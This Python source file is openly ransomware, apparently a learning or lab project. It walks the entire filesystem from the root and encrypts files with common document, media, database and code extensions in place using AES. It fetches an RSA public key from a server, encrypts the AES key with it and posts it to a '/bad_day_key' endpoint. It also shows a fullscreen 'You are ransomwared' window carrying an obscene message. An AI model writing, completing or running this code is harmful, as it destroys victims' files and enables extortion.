from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from tkinter import *
import requests

import os
import tkinter as tk

AES_key = get_random_bytes(32)

filetype_set = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
 ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp",
".tif", ".tiff", ".mp4", ".avi", ".mp3", ".wav", ".zip",
".rar", ".7z", ".sql", ".mdb", ".db", ".bak", ".php", ".html",
".asp", ".aspx", ".js", ".java", ".py", ".c", ".cpp", ".cs",
".odt", ".ods", ".ini", ".cfg", ".log", ".iso"}

def main():

    pass

def test():
    pathen = "victim/A2/file3.txt"
    f = open(pathen,"rb")
    print(f.read())
    f.seek(0)
    encrypt_file(pathen)
    print(f.read())
    f.seek(0)
    decrypt_file(pathen)
    print(f.read())
    
    
def seek_and_encrypt():
    root_directory = os.path.abspath(os.sep)
    for dir_path, dir_names, file_names in os.walk(root_directory):
    #for dir_path, dir_names, file_names in os.walk(os.getcwd()):
        for filename in file_names:
            file_extension = os.path.splitext(filename)[1]
            if file_extension in filetype_set:
                encrypt_file(dir_path + filename)
        #print(files.path.splitext()[1])


       
def encrypt_file(file_path):
    
    f = open(file_path,"r+b")
    file_data = f.read()
    nonce = get_random_bytes(8)
    cipher = AES.new(AES_key, AES.MODE_CTR, nonce=nonce)
    encrypted_data = cipher.encrypt(file_data)
    
    f.seek(0)
    f.write(nonce)
    f.write(encrypted_data)
    f.truncate()
    f.close()
    
def decrypt_file(file_path):
    f = open(file_path,"r+b")
    nonce = f.read(8)
    encrypted_data = f.read()
    cipher = AES.new(AES_key, AES.MODE_CTR, nonce=nonce)
    decrypted_data = cipher.decrypt(encrypted_data)
    
    f.seek(0)
    f.write(decrypted_data)
    f.truncate()
    f.close()
    pass

def recieve_pub_key():
    request = requests.get("http://localhost:8000/key")
    return request.json()["key"]
    
    
def encrypt_and_send_ransom_key():
    pub_key = RSA.importKey(recieve_pub_key())
    cipher_rsa = PKCS1_OAEP.new(pub_key)
    encrypted_ransomkey = cipher_rsa.encrypt(AES_key)
    
    response = requests.post("http://localhost:8000/bad_day_key", data= encrypted_ransomkey)
    print(response.status_code)
    print(response.text)

def klick():
    print("button klicked")

def run_ui():
    root = Tk()
    root.title("You are ransomwared")
    root.attributes("-fullscreen", True)

    label = Label(root,text = "Fuck you")
    label.pack()    
    root.mainloop()
    
main()